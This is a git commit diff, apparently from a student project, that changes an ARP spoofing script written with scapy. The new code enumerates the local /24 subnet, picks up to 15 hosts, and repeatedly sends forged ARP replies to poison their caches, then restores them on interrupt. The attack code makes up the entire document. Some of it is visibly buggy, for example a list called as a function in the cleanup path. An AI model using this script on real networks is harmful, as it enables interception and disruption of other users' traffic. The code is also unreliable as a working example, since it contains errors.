b1fd0f35a0fed27cb3292664ab4be5f98ef7894b
Konstantin <k.i.stoyanov@student.tue.nl>
2023-06-01 15:36:55 +0200

    add:scanning the range of the network

--- arpSpoofing.py
+++ arpSpoofing.py
@@ -1,40 +1,16 @@
 from scapy.all import Ether, ARP, srp, send, conf, get_if_addr
+import scapy.all as scapy
 import time
+import ipaddress
 
-def scan_ip():
-    # Get the IP address and netmask of the default network interface
-    ip_address = conf.iface.ip
-    netmask = conf.iface.netmask
+def get_network_range(ip_address):
+    # Get the subnet mask based on the IP address
+    network = ipaddress.ip_interface(ip_address+'/24')
+    network_range = set(str(ip) for ip in network.network.hosts())
 
-    # Calculate the network address and the number of host bits
-    ip_parts = ip_address.split('.')
-    netmask_parts = netmask.split('.')
+    return network_range
 
-    network_address = '.'.join([str(int(ip_parts[i]) & int(netmask_parts[i])) for i in range(4)])
-    # Define the IP range to scan
-    ip_range = network_address + '/24'
-
-    # Create an ARP request packet
-    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
-
-    # Send the ARP request and collect responses
-    result = srp(arp_request, timeout=2, verbose=0)[0]
-
-    target_ips = []
-    # Process the responses
-    for sent, received in result:
-        ip = received.psrc
-        mac = received.hwsrc
-        target_ips.append(ip)
-
-    #limit the size of the list to 10
-    target = target_ips[:10]
-    
-    return target_ips
-
-
-
-#Returns MAC address of any device connected to the network
+#Returns MAC address of any devie connected to the network
 #If ip is down, returns None instead
 def get_mac(ip):
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
@@ -74,12 +50,18 @@ if __name__ == "__main__":
     # victim ip address
     # gateway ip address
     host = get_if_addr(conf.iface)
+    print(host)
+    network_range = get_network_range(host)
+    network_range.remove(host)
+    network_range = list(network_range)
+    network_range = network_range[0:15]
+    print(network_range)
     # print progress to the screen
     verbose = True
     # enable ip forwarding
     try:
         while True:
-            for target in scan_ip():
+            for target in network_range:
                 # telling the `target` that we are the `host`
                 spoof(target, host, verbose)
                 # telling the `host` that we are the `target`
@@ -88,6 +70,7 @@ if __name__ == "__main__":
                 time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        for target in scan_ip():
+        for target in network_range():
             restore(target, host)
             restore(host, target)
+
